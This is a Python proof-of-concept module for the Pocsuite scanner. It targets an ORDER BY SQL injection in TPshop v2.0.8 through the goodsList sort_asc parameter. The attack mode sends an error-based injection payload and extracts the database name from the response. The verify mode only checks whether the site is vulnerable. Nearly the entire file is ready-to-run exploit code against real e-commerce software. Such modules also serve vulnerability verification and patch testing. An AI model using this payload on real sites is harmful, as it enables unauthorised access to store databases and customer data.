#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'TPshopv2.0.8 sql injection Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://www.bodkin.ren/index.php/archives/244/']
    desc = '''tpshopv2.0.8 /application/home/controller/Goods.php存在order by sql注入'''

    vulDate = '2018-01-27'
    createDate = '2019-04-16'
    updateDate = '2019-04-16'

    appName = 'TPshop'
    appVersion = 'v2.0.8'
    appPowerLink = 'http://www.tp-shop.cn'
    samples = ['re']

    
    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/index.php/Home/Goods/goodsList/id/1/sort/shop_price/sort_asc/,(select count(*) from information_schema.columns group by concat(0x7e,(select database()),0x7e,floor(rand()*2)))' 
        while True:
            resp = req.get(self.url + payload1)
            dbname1 = re.findall("~(.*?)~", resp.content)
            time.sleep(2)
            if dbname1:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['Database'] = {}
                result['Database']['DBname'] = dbname1[0]
                break
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/index.php/Home/Goods/goodsList/id/1/sort/shop_price/sort_asc/,(select count(*) from information_schema.columns group by concat(0x7e,1,0x7e,floor(rand()*2)))' 
        while True:
            resp = req.get(self.url + payload1)
            dbname1 = re.findall("~(.*?)~", resp.content)
            time.sleep(2)
            if dbname1:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                break

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

